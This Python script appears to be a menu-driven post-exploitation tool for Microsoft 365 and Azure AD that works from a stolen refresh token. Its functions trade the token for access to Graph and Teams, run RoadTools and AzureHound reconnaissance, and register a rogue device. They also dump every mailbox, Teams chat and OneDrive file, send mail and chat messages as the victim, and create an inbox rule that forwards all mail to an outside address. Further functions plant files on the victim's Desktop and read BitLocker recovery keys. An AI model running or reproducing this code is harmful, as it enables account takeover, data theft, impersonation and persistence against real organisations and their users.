#!/usr/bin/env python3 

import json
import sys
import subprocess
import requests
import random
import base64
import os
import time
import jwt
import re
import colorama
from colorama import Fore, Back, Style, init


# ----------------RoadTools----------------
def roadtools_execute():
    print(Fore.GREEN +"[+] Running roadtx - Get default token.")

    refreshtoken = token_input_file["refresh_token"]
    roadtx_cmd = ['roadtx','gettoken', '--refresh-token', refreshtoken,'-c', '04b07795-8ddb-461a-bbee-02f9e1bf7b46']
    try:
        subprocess.run(roadtx_cmd, shell=False, check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[-] An error occurred. roadtx installed?") 
        return
    else:
        print(Fore.GREEN +"[+] Ran roadtx")

    print(Fore.GREEN +"[+] Running roadrecon")
    roadrecon_cmd = ['roadrecon','gather']
    try:
        subprocess.run(roadrecon_cmd, shell=False, check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[-] An error occurred. roadrecon installed?") 
        return
    else:
        print(Fore.GREEN +"[+] Ran roadrecon")
        print(Fore.GREEN +"[+] Done")


def roadtools_register_device():
    print(Fore.GREEN +"[+] Running roadtx to get DRS token")
    
    refreshtoken = token_input_file["refresh_token"]
    roadtx_cmd = ['roadtx','gettoken', '--refresh-token', refreshtoken,'-c','04b07795-8ddb-461a-bbee-02f9e1bf7b46','-r' 'drs']
    
    try:
        subprocess.run(roadtx_cmd, shell=False, check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[-] An error occurred. roadtx installed?") 
        return
    else:
        print(Fore.GREEN + "[+] Got token")

    new_device_name = input("Enter the name of the new Device: ")
    roadtx_cmd = ['roadtx','device', '-n', new_device_name]

    try:
        subprocess.run(roadtx_cmd, shell=False, check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[-] An error occurred") 
        return
    else:
        print(Fore.GREEN +"[+] Device registered")
        print(Fore.GREEN +"[+] Done")


def print_roadtools_options():
    menu_options_roadtools = {
    1: ["Run RoadTools",roadtools_execute],
    2: ["Register Device via RoadTools", roadtools_register_device],
    }
    while True:
        print_menu(menu_options_roadtools)


# ----------------AzureHound----------------
def azurehound_execute():
    print(Fore.GREEN +"[+] Get token to use with azurehound")
    token_bundle = get_access_token_with_refresh_token(
        "1950a258-227b-4e31-a9cf-717495945fc2", "https://graph.microsoft.com"
    )
    azurehound_path = input("Enter the path to the azurehound binary: ")
    tenant_name = input("Enter the name of the tenant: ") 
    print(Fore.GREEN +"[+] Running azurehound")
    
    azurehound_cmd = [azurehound_path,'-r', token_bundle["refresh_token"],'list','--tenant',tenant_name,'-o','output.json']

    try:
        subprocess.run(azurehound_cmd, shell=False, check=True)
    except subprocess.CalledProcessError:
        print(Fore.RED + "[-] An error occurred") 
        return
    else:
        print(Fore.GREEN +"[+] Done")

# ----------------Teams----------------
def download_recent_chats():
    print(Fore.GREEN +"[+] Getting recent conversations")
    path = "./teams"
    skype_token = get_skype_token()
    skype_user_id = get_skype_id_from_jwt(skype_token)
    conversations = skype_api_get_recent_conversations(skype_token)

    for conversation in conversations:
        conversation_id = conversation["id"]
        print(Fore.GREEN +"[+] Found conversation with ID {0}".format(conversation_id))
        folder_path = path + "/" + conversation_id
        create_folder(folder_path)
        skype_api_download_message_from_conversation(skype_token,conversation_id, folder_path,skype_user_id)
    
def skype_api_get_recent_conversations(skype_token):
    url = skype_token["regionGtms"]["chatService"] + "/v1/users/ME/conversations/"
    skype_type = "conversations"
    conversations = skype_api_get_all_paginated_data_via_syncState(skype_token,url,skype_type)
    return conversations

def skype_api_download_message_from_conversation(skype_token, conversation_id, folder_path,skype_user_id):
    url = skype_token["regionGtms"]["chatService"] + "/v1/users/ME/conversations/{0}/messages".format(conversation_id)
    skype_type = "messages"
    messages = skype_api_get_all_paginated_data_via_syncState(skype_token,url, skype_type)

    with open(folder_path + "/messages.json", "w") as f:
        f.write(json.dumps(messages))
        print(Fore.GREEN +"[+] Messages downloaded for conversation ID {0}".format(conversation_id))

    for message in messages:
        if "amsreferences" in message and len(message["amsreferences"]) !=0:
            skype_api_download_ams_file(skype_token, message["amsreferences"],folder_path)

    write_chat_conversation_html(messages, conversation_id, folder_path,skype_user_id)

def write_chat_conversation_html(messages, conversation_id, folder_path,skype_user_id):

    messages.reverse()

    with open(folder_path + "/conversation.html", "a") as f:
        f.write('''<!DOCTYPE html><html><head></head><body><style>
            body {margin: 0 auto;padding: 0 20px; background-color: #F5F5F5;}
            .container {border: 2px solid #ffffff; background-color: #ffffff; border-radius: 5px; padding: 5px;  margin: 10px ;margin-left: 0px;margin-right: 150px;}
            .darker {border-color: #C8BFE7;  background-color: #C8BFE7;margin-left: 150px; margin-right: 0px;}
            .name-left {float: left;color: #757575;}
            .name-right {float: right;color: #757575;}
            .container::after { content: "";  clear: both;  display: table;}
            .time-left {float: left;color: #757575;}
            .time-right {float: right;color: #757575;}
            p{margin-top:40px;}
            </style>''')
        for message in messages:
            if message["messagetype"] == "RichText/Html":

                if "amsreferences" in message and len(message["amsreferences"]) !=0:
                    for amsreference in message["amsreferences"]:
                        regex = 'src=".*'+ amsreference +'\/views\/imgo"'
                        message["content"] = re.sub(regex, 'src="./' + amsreference +'"' ,message["content"])

                if message["from"][-42:] == skype_user_id:
                    f.write('<div class="container darker">')
                    f.write('<span class="name-right">' + message["imdisplayname"] + '</span>')
                    f.write("<p>" + message["content"] + "</p>")
                    f.write('<span class="time-right">'+ message["composetime"] +'</span>')
                    f.write('</div>')
                else:
                    f.write('<div class="container">')
                    f.write('<span class="name-left">' + message["imdisplayname"] + '</span>')
                    f.write("<p>" + message["content"] + "</p>")
                    f.write('<span class="time-left">'+ message["composetime"] +'</span>')
                    f.write('</div>')
        f.write("</body></html>")



def get_skype_id_from_jwt(skype_token):
    token = skype_token["tokens"]["skypeToken"]
    content = jwt.decode(token, options={"verify_signature": False})
    return content["skypeid"]

def skype_api_download_ams_file(skype_token,amsreferences,folder_path):
    for amsreference in amsreferences:
        file_path = folder_path + "/" + os.path.normpath(amsreference)
        url = skype_token["regionGtms"]["ams"] + "/v1/objects/{0}/views/imgo?v=1".format(amsreference)
        
        headers = {
        "Host": "{0}".format(skype_token["regionGtms"]["ams"][8:]),
        "Authorization": "skype_token {0}".format(skype_token["tokens"]["skypeToken"])
        }

        fileContent = request_retry(url, headers)
        with open(file_path, "wb") as f:
            f.write(fileContent.content)
        print(Fore.GREEN + "[+] Downloaded file AMS {0}".format(amsreference))

def skype_api_get_all_paginated_data_via_syncState(skype_token,url,skype_type):
    headers = {
        "Host": "{0}".format(skype_token["regionGtms"]["chatService"][8:]),
        "Authentication": "skypetoken={0}".format(skype_token["tokens"]["skypeToken"])
    }

    skype_api_results = []
    url = url

    while url:
        skype_api_result = request_retry(url, headers).json()
        skype_api_results.extend(skype_api_result[skype_type])

        if len(skype_api_result[skype_type])!=0 :
            url = skype_api_result["_metadata"]["syncState"]
        else:
            url = None
    return skype_api_results

def skype_api_send_message():
    print(Fore.GREEN +"[+] Send a Chat Message in Teams in an existing recent conversation")
    skype_token = get_skype_token()
    conversations = skype_api_get_recent_conversations(skype_token)
    print(Fore.GREEN + "[+] found following conversation IDs: ")
    i = 0
    for conversation in conversations:
        print(i, "--", conversation["id"])
        i = i + 1

    while True: 
        conversation_id_input = input("Select conversation ID: ")
        if conversation_id_input.isnumeric() == False:
            print("Wrong input. Please enter a number ...")   
        elif int(conversation_id_input) > len(conversations)-1:
            print("Invalid option. Please enter a number between 0 and {0}".format(len(conversations)-1))
        else:
            conversation_id = conversations[int(conversation_id_input)]["id"]
            chatMessage = input("Enter your chat message: ")
            randomNumber = random.randrange(9000000000000000000)

            headers = {
            "Host": "{0}".format(skype_token["regionGtms"]["chatService"][8:]),
            "Accept": "json",
            "Authentication": "skypetoken={0}".format(
                skype_token["tokens"]["skypeToken"]
                ),
            "Connection": "close",
            "content-type": "application/json",
            }

            json_data = {
            "content": "<p>{0}</p>".format(chatMessage),
            "messagetype": "RichText/Html",
            "contenttype": "text",
            "amsreferences": [],
            "clientmessageid": "{0}".format(randomNumber),
            "imdisplayname": "",
            "properties": {
            "importance": "",
            "subject": "",
            },
            }

            response = requests.post(
                "{0}/v1/users/ME/conversations/{1}/messages".format(
                    skype_token["regionGtms"]["chatService"],conversation_id
                    ),
                headers=headers,
                json=json_data,
                verify= verify_tls_errors,
                )

            if response.status_code == 201:
                print(Fore.GREEN +"[+] Message sent")
                break
            else:
                print(Fore.RED + "[-] Message NOT sent")
                print(response.json())
                break

def print_teams_options():
    menu_options_teams = {
        1: ["Download recent conversations", download_recent_chats],
        2: ["Send Chat Message in Teams", skype_api_send_message],
    }

    while True:
        print_menu(menu_options_teams)

# ----------------Email----------------
def send_email():
    print(Fore.GREEN +"[+] Sending an Email via MS Graph")
    token_bundle = get_access_token_with_refresh_token(
        "57336123-6e14-4acc-8dcf-287b6088aa28", "https://graph.microsoft.com"
    )
    subject = input("Enter the subject: ")
    content = input("Enter the content (text only): ")
    recipient = input("Enter the recipient: ")

    headers = {
        "Host": "graph.microsoft.com",
        "Content-Type": "application/json",
        "Authorization": "Bearer {0}".format(token_bundle["access_token"]),
    }

    json_data = {
        "message": {
            "subject": "{0}".format(subject),
            "body": {
                "contentType": "Text",
                "content": "{0}".format(content),
            },
            "toRecipients": [
                {
                    "emailAddress": {
                        "address": "{0}".format(recipient),
                    },
                },
            ],
        },
        "saveToSentItems": "false",
    }

    response = requests.post(
        "https://graph.microsoft.com/v1.0/me/sendMail",
        headers=headers,
        json=json_data,
        verify= verify_tls_errors,
    )
    if response.status_code == 202:
        print(Fore.GREEN +"[+] E-Mail sent")
    else:
        print(Fore.RED + "[-] E-Mail NOT sent")
        print(response.json())


def download_all_emails():
    print(Fore.GREEN +"[+] Creating Folders and Download all Mails")
    token_bundle = get_access_token_with_refresh_token(
        "d3590ed6-52b3-4102-aeff-aad2292ab01c", "https://graph.microsoft.com"
    )
    create_mail_root_folders(token_bundle["access_token"])



def create_mail_root_folders(token):

    main_folders = ms_graph_get_all_paginated_data_via_nextLink(token,"https://graph.microsoft.com/v1.0/me/mailFolders?includeHiddenFolders=true")

    for folder in main_folders:
        folder_path = os.path.normpath("./mails/" + folder["displayName"])
        create_folder(folder_path)
        download_all_mails_in_folder(token, folder["id"], folder_path)
        if folder["childFolderCount"] != 0:
            folder["childs"] = get_and_create_mail_child_folders(token, folder["id"], folder_path)
        else:
            pass

def get_and_create_mail_child_folders(token, folder_id, parent_folder_path):

    graph_results = ms_graph_get_all_paginated_data_via_nextLink(token,"https://graph.microsoft.com/v1.0/me/mailFolders/{0}/childFolders?includeHiddenFolders=true".format(folder_id))
    
    for folder in graph_results:
        full_path = os.path.normpath(parent_folder_path + "/" + folder["displayName"])
        create_folder(full_path)
        download_all_mails_in_folder(token, folder["id"], full_path)
        if folder["childFolderCount"] != 0:
            folder["childs"] = get_and_create_mail_child_folders(token, folder["id"], full_path)
        else:
            pass

    return graph_results

def download_all_mails_in_folder(token, folder_id, path):
    
    graph_results = ms_graph_get_all_paginated_data_via_nextLink(token,"https://graph.microsoft.com/v1.0/me/mailFolders/{0}/messages".format(folder_id))

    for mail in graph_results:
        mail_body = get_mail_by_id(token, mail["id"])
        short_mail_id = mail["id"].split("_")[-1]
        short_mail_id= os.path.normpath(short_mail_id)
        with open(path + "/" + short_mail_id + ".eml", "wb") as f:
            f.write(mail_body)

def get_mail_by_id(token, mail_id):

    headers = {
        "Host": "graph.microsoft.com",
        "Authorization": "Bearer {0}".format(token),
    }

    url = "https://graph.microsoft.com/v1.0/me/messages/{0}/$value".format(mail_id)
    result = request_retry(url, headers).content
    print(Fore.GREEN +"[+] Got Mail {0}".format(mail_id))
    return result


def add_forwarding_rule():
    print(Fore.GREEN +"[+] Add a forwardTo rule via MS Graph")
    token_bundle = get_access_token_with_refresh_token(
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264", "https://graph.microsoft.com"
    )
    display_name = input("Enter the display name of the rule: ")
    address = input("Enter the forwardTo address: ")
    recipient_name = input("Enter the recipients name: ")

    headers = {
        "Host": "graph.microsoft.com",
        "Content-Type": "application/json",
        "Authorization": "Bearer {0}".format(token_bundle["access_token"]),
    }

    json_data = {
        "displayName": "{0}".format(display_name),
        "sequence": 2,
        "isEnabled": True,
        "conditions": {},
        "actions": {
            "forwardTo": [
                {
                    "emailAddress": {
                        "name": "{0}".format(recipient_name),
                        "address": "{0}".format(address),
                    },
                },
            ],
            "stopProcessingRules": True,
        },
    }

    response = requests.post(
        "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
        headers=headers,
        json=json_data,
        verify= verify_tls_errors,
    )

    if response.status_code == 201:
        print(Fore.GREEN +"[+] Rule created")
    else:
        print(Fore.RED + "[-] Rule NOT created")
        print(response.json())


def print_email_options():
    menu_options_email = {
    1: ["Send Email",send_email],
    2: ["Download all Emails", download_all_emails],
    3: ["Add Forwarding Rule",add_forwarding_rule],
    }

    while True:
        print_menu(menu_options_email)

# ----------------OneDrive----------------
def upload_file_to_user_desktop():
    print(Fore.GREEN +"[+] Uploads a file to the users Desktop folder (filesize < 4 MB)")
    path_to_source_file = input("Enter the path to the file: ")
    destination_file_name = input("Enter a name for the file on the target: ")
    token_bundle = get_access_token_with_refresh_token(
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264", "https://graph.microsoft.com"
    )
    headers = {
        "Content-Type": "text/plain",
        "Authorization": "Bearer {0}".format(token_bundle["access_token"]),
    }
    try:
        with open(path_to_source_file, "rb") as f:
            data = f.read()
    except IOError:
        print(Fore.RED + "[-] file not found")
        return

    response = requests.put(
        "https://graph.microsoft.com/v1.0/me/drive/root:/Desktop/{0}:/content".format(
            destination_file_name
        ),
        headers=headers,
        data=data,
    )
    print(Fore.GREEN +"[+] File uploaded")

def download_all_files():
    print(Fore.GREEN +"[+] Downloading all files in users default Drive")
    token_bundle = get_access_token_with_refresh_token(
        "d3590ed6-52b3-4102-aeff-aad2292ab01c", "https://graph.microsoft.com"
    )
    path = "./onedrive"
    url = "https://graph.microsoft.com/v1.0/me/drive/root/children"

    create_onedrive_folders_and_download_files_in_folder(token_bundle["access_token"],path,url)


def create_onedrive_folders_and_download_files_in_folder(token,path, url):
    graph_results = ms_graph_get_all_paginated_data_via_nextLink(token,url)
    
    for element in graph_results:
        if check_if_file(element):
            download_url = element["@microsoft.graph.downloadUrl"]
            file_path = path + "/" + element["name"]
            download_file_by_id(download_url,file_path)
            print(Fore.GREEN +"[+] Got file {0}.".format(file_path))
        else:
            local_file_path = path + "/" +element["name"]
            create_folder(local_file_path)
            if element["folder"]["childCount"] != 0:
                ID = element["id"]
                url = "https://graph.microsoft.com/v1.0/me/drive/items/{0}/children".format(ID)
                create_onedrive_folders_and_download_files_in_folder(token,local_file_path, url)

                
def check_if_file(element):
    if "file" in element:
        return True
    else:
        return False

def download_file_by_id(download_url,file_path):
    headers = {
    }
    response = request_retry(download_url,headers)

    with open(file_path, mode='wb') as localfile:
        localfile.write(response.content)

def print_onedrive_options():
    
    menu_options_onedrive = {
    1: ["Upload File to Desktop",upload_file_to_user_desktop],
    2: ["Download all Files",download_all_files],
    }
    
    while True:
        print_menu(menu_options_onedrive)

# ----------------AzureGraph----------------
def read_bitlocker_recovery_keys():
    print(Fore.GREEN +"[+] Read BitLocker recovery keys from Azure Graph")
    token_bundle = get_access_token_with_refresh_token(
        "00b41c95-dab0-4487-9791-b9d2c32c80f2", "https://graph.windows.net"
    )

    headers = {
        "Host": "graph.windows.net",
        "Authorization": "Bearer {0}".format(token_bundle["access_token"]),
        "Accept": "application/json",
    }

    response = requests.get(
        "https://graph.windows.net/myorganization/devices?api-version=1.61-internal&$select=bitLockerKey,displayName",
        headers=headers,
        verify= verify_tls_errors,
    )

    responsdata = response.json()
    values = responsdata["value"]

    for i in values:
        for keys in i["bitLockerKey"]:
            print(
                "Found recovery key for {0}: {1}".format(
                    i["displayName"], base64.b64decode(keys["keyMaterial"])
                )
            )
    print(Fore.GREEN +"[+] Done")


def print_azure_graph_options():
    menu_options_AzureGraph = {
    1: ["Read BitLocker Recovery Keys",read_bitlocker_recovery_keys],
    }

    while True:
        print_menu(menu_options_AzureGraph)

# ----------------General Functions----------------

def print_menu(menu_options):
    print(Style.RESET_ALL)
    for key in menu_options.keys():
        print(key, "--", menu_options[key][0])

    print(Fore.BLUE + str(len(menu_options)+1) + " -- Return")
    print(Fore.RED + str(len(menu_options)+2) + " -- Exit")

    option = input("Enter your choice: ")
    if option.isnumeric() == False:
        print(Fore.RED+ "[-] Wrong input. Please enter a number ...")
        return
    elif int(option) > len(menu_options)+2:
        print(Fore.RED+ "[-] Invalid option. Please enter a number between 1 and {0}".format(len(menu_options)+2))
        return
    elif int(option) == len(menu_options)+1:
        main()
    elif int(option) == len(menu_options)+2:
         print(Fore.GREEN + "[+] Bye")
         exit()
    else:
        menu_options[int(option)][1]()

def get_access_token_with_refresh_token(clientID, scope):
    headers = {
        "Host": "login.microsoftonline.com",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = "client_id={0}&scope={1}/.default&refresh_token={2}&grant_type=refresh_token".format(
        clientID, scope, token_input_file["refresh_token"]
    )

    try:
        response = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            headers=headers,
            data=data,
            verify= verify_tls_errors,
            )
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "[-] An error occurred")
        exit()

    if response.status_code != 200:
        print(Fore.RED +"[-] Something went wrong during refresh token exchange")
        print(response.content)
        exit()
    else:
        new_tokens = response.json()
        return new_tokens


def get_skype_token():
    token_bundle = get_access_token_with_refresh_token(
        "00b41c95-dab0-4487-9791-b9d2c32c80f2", "https://api.spaces.skype.com"
    )
    headers = {
        "Host": "teams.microsoft.com",
        "Authorization": "Bearer {0}".format(token_bundle["access_token"]),
        "Connection": "close",
    }
    response = requests.post(
        "https://teams.microsoft.com/api/authsvc/v1.0/authz",
        headers=headers,
        verify= verify_tls_errors,
    )
    response_skype_token = response.json()
    return response_skype_token

def create_folder(folder_path):        
        os.makedirs(folder_path, exist_ok=True)
        print(Fore.GREEN +"[+] Created folder {0}".format(folder_path))

def ms_graph_get_all_paginated_data_via_nextLink(token, url):
    headers = {
        "Host": "graph.microsoft.com",
        "Authorization": "Bearer {0}".format(token),
    }

    graph_results = []
    url = url

    while url:
        graph_result = request_retry(url, headers).json()
        graph_results.extend(graph_result["value"])

        if "@odata.nextLink" in graph_result:
            url = graph_result["@odata.nextLink"]
        else:
            url = None
    return graph_results

def request_retry(url, headers):
    num_retries = 3
    back_off_time_sec = 15
    success_list = [200,201,202]

    for _ in range(num_retries):
        try:           
            response = requests.get(url=url, headers=headers)
            if response.status_code in success_list:
                return response
            if response.status_code == 429:
                print(Fore.RED + "[-] Hit rate limit. Waiting {0} seconds".format(str(back_off_time_sec)))
                time.sleep(back_off_time_sec)
            if response.status_code == 404:
                print(Fore.RED + "[-] Got HTTP Status Code 404")


        except requests.exceptions.ConnectionError:
            pass
    print(Fore.RED + "[-] Something went wrong while fetching data. Max number of retries exceeded.")
    return None




# ----------------Entry----------------
def main():

    #Disabled warnings for better readability
    requests.packages.urllib3.disable_warnings()

    global verify_tls_errors
    verify_tls_errors = True

    colorama.init(autoreset=True)

    try: 
        with open(sys.argv[1], "r") as inputFile:
            global token_input_file
            token_input_file = json.loads(inputFile.read())
    except:
        print(Fore.RED + "[-] An error occurred. Did you specify a valid json file?")
        exit()

    menu_options = {
    1: ["Interact with RoadTools",print_roadtools_options],
    2: ["Run AzureHound",azurehound_execute],
    3: ["Interact with Teams",print_teams_options],
    4: ["Interact with E-Mail",print_email_options],
    5: ["Interact with OneDrive",print_onedrive_options],
    6: ["Interact with Azure Graph",print_azure_graph_options],
    }

    while True:
        print_menu(menu_options)

if __name__ == "__main__":
    main()